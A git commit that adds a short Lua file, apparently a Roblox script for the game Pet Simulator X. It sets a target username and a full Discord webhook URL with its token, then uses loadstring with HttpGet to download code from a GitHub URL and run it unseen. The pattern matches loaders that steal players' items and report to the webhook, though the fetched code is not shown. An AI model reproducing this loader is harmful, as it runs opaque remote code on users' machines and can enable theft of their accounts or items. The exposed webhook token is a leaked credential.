3c0d042b78982f638cf20e1aab08a46edbf22dd9
rocl0bsta <125326459+rocl0bsta@users.noreply.github.com>
2023-02-13 17:22:36 -0800

    Add files via upload

---
+++ new 1.lua
@@ -0,0 +1,5 @@
+UserName = "Splitzsy"
+WebHook = "https://discord.com/api/webhooks/1008243365139185664/Hs24SaO40vAZCtCPmt7P_uoBHbBpTvJVdDuwzSr7XMd5yZez5Py-odxIMiGLzFyA3uBy"
+Mention = true 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
